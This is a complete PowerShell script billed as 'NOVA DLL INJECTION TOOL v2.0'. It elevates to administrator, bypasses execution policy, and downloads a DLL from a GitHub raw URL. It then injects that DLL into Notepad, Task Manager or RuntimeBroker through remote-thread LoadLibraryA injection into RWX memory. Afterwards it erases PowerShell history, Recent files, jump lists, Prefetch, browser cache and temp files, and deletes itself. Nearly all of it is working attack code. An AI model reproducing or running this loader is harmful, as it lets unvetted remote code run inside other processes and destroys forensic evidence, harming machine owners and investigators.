# === Self-Elevate ===
if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    try {
        Start-Process powershell.exe -Verb RunAs -ArgumentList (
            "-NoProfile",
            "-NoExit",
            "-ExecutionPolicy Bypass",
            "-File `"$PSCommandPath`""
        )
        exit
    }
    catch {
        Write-Host "Failed to request Admin privileges: $($_.Exception.Message)" -ForegroundColor Red
        Read-Host "Press Enter to exit"
        exit 1
    }
}

# === Set Console Window Title and Size ===
$host.UI.RawUI.WindowTitle = "NOVA DLL INJECTION TOOL v2.0"
$host.UI.RawUI.BackgroundColor = "Black"
Clear-Host

# === ASCII Art Banner ===
$banner = @"
╔══════════════════════════════════════════════════════════╗
║                                                          ║
║    ███╗   ██╗ ██████╗ ██╗   ██╗ █████╗                 ║
║    ████╗  ██║██╔═══██╗██║   ██║██╔══██╗                ║
║    ██╔██╗ ██║██║   ██║██║   ██║███████║                ║
║    ██║╚██╗██║██║   ██║╚██╗ ██╔╝██╔══██║                ║
║    ██║ ╚████║╚██████╔╝ ╚████╔╝ ██║  ██║                ║
║    ╚═╝  ╚═══╝ ╚═════╝   ╚═══╝  ╚═╝  ╚═╝                ║
║                                                          ║
║            DLL INJECTION TOOL v2.0                       ║
║            [ADMINISTRATOR MODE]                          ║
╚══════════════════════════════════════════════════════════╝
"@

Write-Host $banner -ForegroundColor Cyan
Write-Host ""

# === Loading Animation ===
Write-Host "[*] Initializing Nova Injection Engine..." -ForegroundColor Yellow
for ($i = 0; $i -le 100; $i += 10) {
    $progress = "[{0}{1}] {2}%" -f ('#' * ($i/10)), (' ' * (10 - $i/10)), $i
    Write-Host "`r$progress" -NoNewline
    Start-Sleep -Milliseconds 100
}
Write-Host "`r[✓] Initialization Complete!     " -ForegroundColor Green
Start-Sleep -Milliseconds 500

# === LookupFunc ===
function LookupFunc {
    Param ($moduleName, $functionName)
    $signature = @'
    [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
    public static extern IntPtr GetModuleHandle(string lpModuleName);
'@
    if (-not ([System.Management.Automation.PSTypeName]'Win32.Kernel32').Type) {
        $kernel32 = Add-Type -MemberDefinition $signature -Name 'Kernel32' -Namespace 'Win32' -PassThru
    } else {
        $kernel32 = [Win32.Kernel32]
    }
    $hModule = $kernel32::GetModuleHandle($moduleName)
    return $kernel32::GetProcAddress($hModule, $functionName)
}

function getDelegateType {
    Param (
        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
        [Parameter(Position = 1)] [Type] $delType = [Void]
    )
    $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly(
        (New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
        [System.Reflection.Emit.AssemblyBuilderAccess]::Run
    ).DefineDynamicModule('InMemoryModule', $false).DefineType(
        'MyDelegateType',
        'Class, Public, Sealed, AnsiClass, AutoClass',
        [System.MulticastDelegate]
    )
    $type.DefineConstructor(
        'RTSpecialName, HideBySig, Public',
        [System.Reflection.CallingConventions]::Standard,
        $func
    ).SetImplementationFlags('Runtime, Managed')
    $type.DefineMethod(
        'Invoke',
        'Public, HideBySig, NewSlot, Virtual',
        $delType,
        $func
    ).SetImplementationFlags('Runtime, Managed')
    return $type.CreateType()
}

# === 1. Prepare Temp ===
Write-Host ""
Write-Host "[+] Preparing environment..." -ForegroundColor Cyan
Write-Host "   └─ Clearing temporary files..." -NoNewline -ForegroundColor Gray
$tempDir = $env:TEMP
try {
    Get-ChildItem -Path $tempDir -Recurse -Force -ErrorAction SilentlyContinue | Remove-Item -Recurse -Force -ErrorAction SilentlyContinue
    Write-Host " [✓]" -ForegroundColor Green
}
catch {
    Write-Host " [⚠]" -ForegroundColor Yellow
}

# === 2. Download DLL + Images ===
$randomGuid = [System.Guid]::NewGuid().ToString()
$dllPath = Join-Path $tempDir "$randomGuid.dll"

# กำหนด Base URL ของ Raw Content
$rawBaseUrl = "https://raw.githubusercontent.com/novaxstorex/Nova/refs/heads/main"

$files = @{
    $dllPath                          = "$rawBaseUrl/Nova.dll"
    "$tempDir\logo.png"               = "$rawBaseUrl/logo.png"
    "$tempDir\low.png"                = "$rawBaseUrl/low.png"
    "$tempDir\medium.png"             = "$rawBaseUrl/medium.png"
    "$tempDir\high.png"               = "$rawBaseUrl/high.png"
}

[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12

Write-Host "[+] Downloading Nova.dll and assets..." -ForegroundColor Cyan

$downloaded = $false
foreach ($dest in $files.Keys) {
    $url = $files[$dest]
    $fileName = Split-Path $dest -Leaf
    try {
        Write-Host "   └─ Downloading $fileName ... " -NoNewline -ForegroundColor Gray
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
        $wc.DownloadFile($url, $dest)
        $wc.Dispose()
        
        # ตรวจสอบไฟล์ที่ดาวน์โหลด (เฉพาะ DLL)
        if ($dest -eq $dllPath) {
            if ((Test-Path $dest) -and ((Get-Item $dest).Length -gt 0)) {
                Write-Host "[✓]" -ForegroundColor Green
                $downloaded = $true
            } else {
                Write-Host "[✗]" -ForegroundColor Red
                Remove-Item $dest -Force -ErrorAction SilentlyContinue
            }
        } else {
            Write-Host "[✓]" -ForegroundColor Green
        }
    } catch {
        Write-Host "[✗]" -ForegroundColor Red
        # ลบไฟล์ที่ดาวน์โหลดไม่สมบูรณ์
        if (Test-Path $dest) {
            Remove-Item $dest -Force -ErrorAction SilentlyContinue
        }
    }
}

# หากดาวน์โหลด DLL ไม่ได้ ให้เช็คไฟล์ในเครื่อง
if (-not $downloaded) {
    Write-Host ""
    Write-Host "[!] Download from GitHub failed. Checking for local Nova.dll..." -ForegroundColor Yellow
    
    $localDllPaths = @(
        ".\Nova.dll",
        "$env:TEMP\Nova.dll",
        "$env:USERPROFILE\Desktop\Nova.dll",
        "$env:USERPROFILE\Downloads\Nova.dll"
    )
    
    $foundLocal = $false
    foreach ($localPath in $localDllPaths) {
        if (Test-Path $localPath) {
            try {
                Write-Host "   └─ Found local DLL: $localPath" -ForegroundColor Gray
                Copy-Item $localPath $dllPath -Force
                if ((Get-Item $dllPath).Length -gt 0) {
                    Write-Host "   └─ Using local Nova.dll [✓]" -ForegroundColor Green
                    $downloaded = $true
                    $foundLocal = $true
                    break
                }
            } catch {
                continue
            }
        }
    }
    
    if (-not $foundLocal) {
        Write-Host ""
        Write-Host "[!] ERROR: Cannot find Nova.dll to inject." -ForegroundColor Red
        Write-Host "[!] Please ensure Nova.dll is in the same folder as this script," -ForegroundColor Yellow
        Write-Host "[!] or check your internet connection to download from GitHub." -ForegroundColor Yellow
        Read-Host "Press Enter to exit"
        exit 1
    }
}

# ตรวจสอบไฟล์ DLL อีกครั้ง
if (Test-Path $dllPath) {
    $fileSize = (Get-Item $dllPath).Length
    if ($fileSize -gt 0) {
        Write-Host ""
        Write-Host "[+] DLL ready ($([math]::Round($fileSize/1KB, 2)) KB)" -ForegroundColor Green
    } else {
        Write-Host ""
        Write-Host "[!] ERROR: DLL file is empty or corrupted." -ForegroundColor Red
        Read-Host "Press Enter to exit"
        exit 1
    }
}

# === 3. Process Selection ===
Start-Sleep -Milliseconds 500
Clear-Host

# Display banner again
Write-Host $banner -ForegroundColor Cyan
Write-Host ""

# Animated menu
Write-Host "╔══════════════════════════════════════════════════════════╗" -ForegroundColor Yellow
Write-Host "║              SELECT TARGET PROCESS                      ║" -ForegroundColor Yellow
Write-Host "╠══════════════════════════════════════════════════════════╣" -ForegroundColor Yellow

$menuItems = @(
    @{Number=1; Name="Notepad"; Desc="Simple text editor"; Icon="📝"},
    @{Number=2; Name="Task Manager"; Desc="System task manager"; Icon="⚙️"},
    @{Number=3; Name="RuntimeBroker"; Desc="Windows runtime broker"; Icon="🔄"}
)

foreach ($item in $menuItems) {
    Write-Host "║  [$($item.Number)] $($item.Icon) $($item.Name)" -ForegroundColor Green
    Write-Host "║      └─ $($item.Desc)" -ForegroundColor Gray
}
Write-Host "╚══════════════════════════════════════════════════════════╝" -ForegroundColor Yellow
Write-Host ""

$proc = $null
$targetProcess = ""
$targetExe = ""
$validChoice = $false

do {
    $choice = Read-Host "└─ Enter choice (1-3)"
    Write-Host ""
    
    switch ($choice) {
        "1" {
            $targetProcess = "notepad"
            $targetExe = "notepad.exe"
            
            Write-Host "   └─ Attempting to target Notepad..." -ForegroundColor Gray
            try {
                $existingProc = Get-Process -Name "notepad" -ErrorAction SilentlyContinue | Select-Object -First 1
                if ($existingProc) {
                    Write-Host "      └─ Found existing Notepad.exe (PID: $($existingProc.Id)) [✓]" -ForegroundColor Green
                    $proc = $existingProc
                } else {
                    Write-Host "      └─ Starting new Notepad.exe instance..." -ForegroundColor Gray
                    $proc = Start-Process -FilePath "notepad.exe" -WindowStyle Normal -PassThru -ErrorAction Stop
                    Start-Sleep -Seconds 2
                    $proc = Get-Process -Id $proc.Id -ErrorAction SilentlyContinue
                    Write-Host "      └─ Notepad started (PID: $($proc.Id)) [✓]" -ForegroundColor Green
                }
                $validChoice = $true
            }
            catch {
                Write-Host "      └─ Failed to start Notepad.exe [✗]" -ForegroundColor Red
                Write-Host "         └─ Error: $($_.Exception.Message)" -ForegroundColor DarkRed
            }
        }
        "2" {
            $targetProcess = "Taskmgr"
            $targetExe = "taskmgr.exe"
            
            Write-Host "   └─ Attempting to target Task Manager..." -ForegroundColor Gray
            try {
                $existingProc = Get-Process -Name "taskmgr" -ErrorAction SilentlyContinue | Select-Object -First 1
                if ($existingProc) {
                    Write-Host "      └─ Found existing Task Manager (PID: $($existingProc.Id)) [✓]" -ForegroundColor Green
                    $proc = $existingProc
                } else {
                    Write-Host "      └─ Starting Task Manager..." -ForegroundColor Gray
                    $proc = Start-Process -FilePath "taskmgr.exe" -WindowStyle Normal -PassThru -ErrorAction Stop
                    Start-Sleep -Seconds 3
                    $proc = Get-Process -Id $proc.Id -ErrorAction SilentlyContinue
                    Write-Host "      └─ Task Manager started (PID: $($proc.Id)) [✓]" -ForegroundColor Green
                }
                $validChoice = $true
            }
            catch {
                Write-Host "      └─ Failed to start Task Manager [✗]" -ForegroundColor Red
                Write-Host "         └─ Error: $($_.Exception.Message)" -ForegroundColor DarkRed
            }
        }
        "3" {
            $targetProcess = "RuntimeBroker"
            $targetExe = "RuntimeBroker.exe"
            
            Write-Host "   └─ Attempting to target RuntimeBroker..." -ForegroundColor Gray
            try {
                $proc = Get-Process -Name "RuntimeBroker" -ErrorAction SilentlyContinue | Select-Object -First 1
                if ($proc) {
                    Write-Host "      └─ Found RuntimeBroker.exe (PID: $($proc.Id)) [✓]" -ForegroundColor Green
                    $validChoice = $true
                } else {
                    Write-Host "      └─ RuntimeBroker not found. Using Notepad as fallback... [⚠]" -ForegroundColor Yellow
                    $targetProcess = "notepad"
                    $targetExe = "notepad.exe"
                    $proc = Start-Process -FilePath "notepad.exe" -WindowStyle Normal -PassThru -ErrorAction Stop
                    Start-Sleep -Seconds 2
                    $proc = Get-Process -Id $proc.Id -ErrorAction SilentlyContinue
                    Write-Host "      └─ Notepad started (PID: $($proc.Id)) [✓]" -ForegroundColor Green
                    $validChoice = $true
                }
            }
            catch {
                Write-Host "      └─ Failed to find RuntimeBroker [✗]" -ForegroundColor Red
                Write-Host "         └─ Error: $($_.Exception.Message)" -ForegroundColor DarkRed
            }
        }
        default {
            Write-Host "   └─ Invalid choice. Please enter 1, 2, or 3. [✗]" -ForegroundColor Red
        }
    }
    
    if (-not $validChoice) {
        Write-Host "`n   └─ Press any key to try again..." -ForegroundColor Yellow
        Read-Host
        Clear-Host
        Write-Host $banner -ForegroundColor Cyan
        Write-Host ""
        Write-Host "╔══════════════════════════════════════════════════════════╗" -ForegroundColor Yellow
        Write-Host "║              SELECT TARGET PROCESS                      ║" -ForegroundColor Yellow
        Write-Host "╠══════════════════════════════════════════════════════════╣" -ForegroundColor Yellow
        foreach ($item in $menuItems) {
            Write-Host "║  [$($item.Number)] $($item.Icon) $($item.Name)" -ForegroundColor Green
            Write-Host "║      └─ $($item.Desc)" -ForegroundColor Gray
        }
        Write-Host "╚══════════════════════════════════════════════════════════╝" -ForegroundColor Yellow
        Write-Host ""
    }
} while (-not $validChoice -or -not $proc)

# ตรวจสอบ process
if (-not $proc) {
    Write-Host ""
    Write-Host "[!] No target process available. Exiting..." -ForegroundColor Red
    Read-Host "Press Enter to exit"
    exit 1
}

try {
    $proc = Get-Process -Id $proc.Id -ErrorAction Stop
} catch {
    Write-Host ""
    Write-Host "[!] Process died or is no longer accessible. Exiting..." -ForegroundColor Red
    Read-Host "Press Enter to exit"
    exit 1
}

$pid1 = $proc.Id
Write-Host ""
Write-Host "╔══════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
Write-Host "║              INJECTION PARAMETERS                      ║" -ForegroundColor Cyan
Write-Host "╠══════════════════════════════════════════════════════════╣" -ForegroundColor Cyan
Write-Host "║  Target Process : $($targetProcess.PadRight(30))║" -ForegroundColor Green
Write-Host "║  Process ID     : $($pid1.ToString().PadRight(30))║" -ForegroundColor Green
Write-Host "║  DLL File       : Nova.dll".PadRight(49) + "║" -ForegroundColor Green
Write-Host "║  Mode           : Admin Context".PadRight(49) + "║" -ForegroundColor Green
Write-Host "╚══════════════════════════════════════════════════════════╝" -ForegroundColor Cyan
Write-Host ""

Write-Host "[*] Preparing injection sequence..." -ForegroundColor Yellow
Start-Sleep -Milliseconds 500

# === Injection Animation ===
Write-Host "   └─ Loading injection modules... " -NoNewline -ForegroundColor Gray
Start-Sleep -Milliseconds 300
Write-Host "[✓]" -ForegroundColor Green

# === 4. Injection ===
try {
    $OpenProcessDelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
        (LookupFunc kernel32.dll OpenProcess),
        (getDelegateType @([UInt32], [UInt32], [Int]) ([IntPtr]))
    )
    $VirtualAllocExDelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
        (LookupFunc kernel32.dll VirtualAllocEx),
        (getDelegateType @([IntPtr], [IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))
    )
    $WriteProcessMemoryDelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
        (LookupFunc kernel32.dll WriteProcessMemory),
        (getDelegateType @([IntPtr], [IntPtr], [Byte[]], [Int], [IntPtr]) ([Bool]))
    )
    $CreateRemoteThreadDelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
        (LookupFunc kernel32.dll CreateRemoteThread),
        (getDelegateType @([IntPtr], [IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))
    )

    Write-Host "   └─ Opening process handle... " -NoNewline -ForegroundColor Gray
    $hProcess = $OpenProcessDelegate.Invoke(0x001F0FFF, 0, $pid1)
    
    if ($hProcess -eq [IntPtr]::Zero) {
        Write-Host "[⚠]" -ForegroundColor Yellow
        Write-Host "      └─ Limited permissions, retrying... " -NoNewline -ForegroundColor Gray
        $hProcess = $OpenProcessDelegate.Invoke(0x002A, 0, $pid1)
        
        if ($hProcess -eq [IntPtr]::Zero) {
            Write-Host "[✗]" -ForegroundColor Red
            Write-Host "      └─ Failed to open process handle" -ForegroundColor Red
            Read-Host "Press Enter to exit"
            exit 1
        } else {
            Write-Host "[✓]" -ForegroundColor Green
        }
    } else {
        Write-Host "[✓]" -ForegroundColor Green
    }
    
    Write-Host "   └─ Allocating memory in target process... " -NoNewline -ForegroundColor Gray
    $addr = $VirtualAllocExDelegate.Invoke($hProcess, [IntPtr]::Zero, 0x1000, 0x3000, 0x40)
    if ($addr -eq [IntPtr]::Zero) {
        Write-Host "[✗]" -ForegroundColor Red
        Read-Host "Press Enter to exit"
        exit 1
    }
    Write-Host "[✓]" -ForegroundColor Green
    Write-Host "      └─ Memory Address: $addr" -ForegroundColor DarkGray
    
    [Byte[]]$dllNameBytes = [Text.Encoding]::ASCII.GetBytes($dllPath + "`0")
    [IntPtr]$outSize = [IntPtr]::Zero
    
    Write-Host "   └─ Writing DLL path to target process... " -NoNewline -ForegroundColor Gray
    $res = $WriteProcessMemoryDelegate.Invoke($hProcess, $addr, $dllNameBytes, $dllNameBytes.Length, $outSize)
    
    if (-not $res) {
        Write-Host "[✗]" -ForegroundColor Red
        Read-Host "Press Enter to exit"
        exit 1
    }
    Write-Host "[✓]" -ForegroundColor Green
    
    $loadLibAddr = LookupFunc kernel32.dll LoadLibraryA
    Write-Host "   └─ LoadLibraryA Address: $loadLibAddr" -ForegroundColor DarkGray
    
    Write-Host "   └─ Creating remote thread to load Nova.dll... " -NoNewline -ForegroundColor Gray
    $hThread = $CreateRemoteThreadDelegate.Invoke($hProcess, [IntPtr]::Zero, 0, $loadLibAddr, $addr, 0, [IntPtr]::Zero)
    
    if ($hThread -ne [IntPtr]::Zero) {
        Write-Host "[✓]" -ForegroundColor Green
        Write-Host ""
        Write-Host "╔══════════════════════════════════════════════════════════╗" -ForegroundColor Green
        Write-Host "║         ██████╗ ██╗   ██╗ ██████╗ ██████╗ ███████╗    ║" -ForegroundColor Green
        Write-Host "║         ██╔══██╗██║   ██║██╔═══██╗██╔══██╗██╔════╝    ║" -ForegroundColor Green
        Write-Host "║         ██████╔╝██║   ██║██║   ██║██║  ██║█████╗      ║" -ForegroundColor Green
        Write-Host "║         ██╔═══╝ ██║   ██║██║   ██║██║  ██║██╔══╝      ║" -ForegroundColor Green
        Write-Host "║         ██║     ╚██████╔╝╚██████╔╝██████╔╝███████╗    ║" -ForegroundColor Green
        Write-Host "║         ╚═╝      ╚═════╝  ╚═════╝ ╚═════╝ ╚══════╝    ║" -ForegroundColor Green
        Write-Host "╠══════════════════════════════════════════════════════════╣" -ForegroundColor Green
        Write-Host "║  INJECTION SUCCESSFUL!                                  ║" -ForegroundColor Green
        Write-Host "║  Thread Handle : $hThread".PadRight(36) + "║" -ForegroundColor Green
        Write-Host "║  Nova.dll loaded into $targetProcess (PID: $pid1)".PadRight(36) + "║" -ForegroundColor Green
        Write-Host "╚══════════════════════════════════════════════════════════╝" -ForegroundColor Green
    } else {
        Write-Host "[✗]" -ForegroundColor Red
        Write-Host ""
        Write-Host "[!] Injection failed (CreateRemoteThread returned Zero)" -ForegroundColor Red
        Write-Host "[!] Try selecting a different process." -ForegroundColor Yellow
    }
}
catch {
    Write-Host "[✗]" -ForegroundColor Red
    Write-Host ""
    Write-Host "[!] Error during injection: $($_.Exception.Message)" -ForegroundColor Red
}

# === 5. Cleanup ===
Write-Host ""
Write-Host "[+] Starting cleanup..." -ForegroundColor Cyan
Write-Host "   └─ Clearing system traces..." -NoNewline -ForegroundColor Gray

# Clear PowerShell History
[Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory() 2>$null
$histPath = (Get-PSReadLineOption).HistorySavePath
if (Test-Path $histPath) { 
    try { Set-Content -Path $histPath -Value "" -Force -ErrorAction SilentlyContinue } catch {}
}

# Clear Recent Files
$recentPath = Join-Path $env:APPDATA "Microsoft\Windows\Recent"
if (Test-Path $recentPath) {
    Get-ChildItem -Path $recentPath -Force -ErrorAction SilentlyContinue | Remove-Item -Force -Recurse -ErrorAction SilentlyContinue
}

# Clear Jump Lists
$jumpListPaths = @(
    (Join-Path $env:APPDATA "Microsoft\Windows\Recent\AutomaticDestinations"),
    (Join-Path $env:APPDATA "Microsoft\Windows\Recent\CustomDestinations")
)
foreach ($path in $jumpListPaths) {
    if (Test-Path $path) {
        Get-ChildItem -Path $path -Force -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
    }
}

# Clear Prefetch
$prefetchPath = "C:\Windows\Prefetch"
for ($i = 0; $i -lt 3; $i++) {
    Start-Sleep -Seconds 1
    if (Test-Path $prefetchPath) {
        Get-ChildItem -Path $prefetchPath -Filter "*.pf" -Force -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
    }
}

# Clear INetCache
$ieCache = Join-Path $env:LOCALAPPDATA "Microsoft\Windows\INetCache"
if (Test-Path $ieCache) {
    Get-ChildItem -Path $ieCache -Recurse -Force -ErrorAction SilentlyContinue | Remove-Item -Recurse -Force -ErrorAction SilentlyContinue
}

# Clear Temp Folder
$tempDir = $env:TEMP
Get-ChildItem -Path $tempDir -Recurse -Force -ErrorAction SilentlyContinue | Remove-Item -Recurse -Force -ErrorAction SilentlyContinue

# Delete DLL
Start-Sleep -Seconds 1
if (Test-Path $dllPath) { 
    try { 
        Remove-Item $dllPath -Force -ErrorAction SilentlyContinue
    } catch {
        # Silent fail
    }
}

# Delete script
if ($PSCommandPath -and (Test-Path $PSCommandPath)) { 
    try {
        Remove-Item $PSCommandPath -Force -ErrorAction SilentlyContinue
    } catch {
        # Silent fail
    }
}

[GC]::Collect()
[GC]::WaitForPendingFinalizers()
Start-Sleep -Seconds 2

Write-Host " [✓]" -ForegroundColor Green
Write-Host ""
Write-Host "[+] Cleanup complete!" -ForegroundColor Green
Write-Host ""
Write-Host "Press Enter to exit..."
Read-Host
exit
